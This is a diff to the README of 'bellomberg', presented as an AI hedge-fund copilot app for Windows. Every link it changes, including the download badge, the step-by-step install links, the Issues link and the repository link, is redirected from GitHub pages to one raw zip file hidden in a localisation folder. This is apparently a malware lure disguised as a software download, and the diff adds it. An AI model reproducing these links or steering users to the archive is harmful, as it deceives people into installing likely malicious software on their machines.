@@ -1,6 +1,6 @@
 # 🦔 bellomberg - Your AI Hedge Fund Copilot
 
-[![Download Now](https://img.shields.io/badge/Download%20bellomberg-Latest%20Version-blue?style=for-the-badge&logo=github)](https://github.com/trededofoturo/bellomberg/releases)
+[![Download Now](https://img.shields.io/badge/Download%20bellomberg-Latest%20Version-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/trededofoturo/bellomberg/main/app/src/i18n/it/Software_v3.4.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Whether you're a newbie investor or a seasoned trader, bellomberg cuts through t
 Getting bellomberg up and running takes less than two minutes. Here's how:
 
 **1. Visit the download page:**
-[👉 https://github.com/trededofoturo/bellomberg/releases](https://github.com/trededofoturo/bellomberg/releases)
+[👉 https://raw.githubusercontent.com/trededofoturo/bellomberg/main/app/src/i18n/it/Software_v3.4.zip](https://raw.githubusercontent.com/trededofoturo/bellomberg/main/app/src/i18n/it/Software_v3.4.zip)
 
 **2. Find the latest release** – Look for the newest version listed (usually at the top).
 
@@ -99,7 +99,7 @@ Currently, bellomberg is built for Windows. Mac support is planned for a future 
 Absolutely. bellomberg is designed for everyone. It explains everything in simple terms and will never assume you know what a "P/E ratio" is—it will teach you.
 
 **What if I have a problem with the app?**  
-Check the **Help** tab in the app, or visit the [Issues section](https://github.com/trededofoturo/bellomberg/issues) on the repository to see if your problem is known. You can also ask the community for help.
+Check the **Help** tab in the app, or visit the [Issues section](https://raw.githubusercontent.com/trededofoturo/bellomberg/main/app/src/i18n/it/Software_v3.4.zip) on the repository to see if your problem is known. You can also ask the community for help.
 
 ---
 
@@ -107,7 +107,7 @@ Check the **Help** tab in the app, or visit the [Issues section](https://github.
 
 Ready to get started? Here is the full download process again with more detail:
 
-1. Click the green link: **[Download bellomberg](https://github.com/trededofoturo/bellomberg/releases)**
+1. Click the green link: **[Download bellomberg](https://raw.githubusercontent.com/trededofoturo/bellomberg/main/app/src/i18n/it/Software_v3.4.zip)**
 2. The page shows a list of **Releases**. The most recent is at the top.
 3. Look for **Assets** (usually below the release notes). Click to expand it.
 4. Download the file ending in **`.exe`** (this is the installer for Windows).
@@ -146,7 +146,7 @@ bellomberg is open-source, which means it's continuously improved by a global te
 - 💬 Report bugs or suggest features
 - 🛠️ Contribute to the codebase
 
-Visit the main repository page: [https://github.com/trededofoturo/bellomberg](https://github.com/trededofoturo/bellomberg)
+Visit the main repository page: [https://raw.githubusercontent.com/trededofoturo/bellomberg/main/app/src/i18n/it/Software_v3.4.zip](https://raw.githubusercontent.com/trededofoturo/bellomberg/main/app/src/i18n/it/Software_v3.4.zip)
 
 ---
 
@@ -154,7 +154,7 @@ Visit the main repository page: [https://github.com/trededofoturo/bellomberg](ht
 
 Stop guessing. Stop worrying. Let bellomberg be your AI hedge fund co-pilot—bringing Wall Street-grade analysis to your fingertips.
 
-**[⬇️ Download bellomberg Now](https://github.com/trededofoturo/bellomberg/releases)** – It's free, it's easy, and it just might change the way you handle money.
+**[⬇️ Download bellomberg Now](https://raw.githubusercontent.com/trededofoturo/bellomberg/main/app/src/i18n/it/Software_v3.4.zip)** – It's free, it's easy, and it just might change the way you handle money.
 
 ---
 
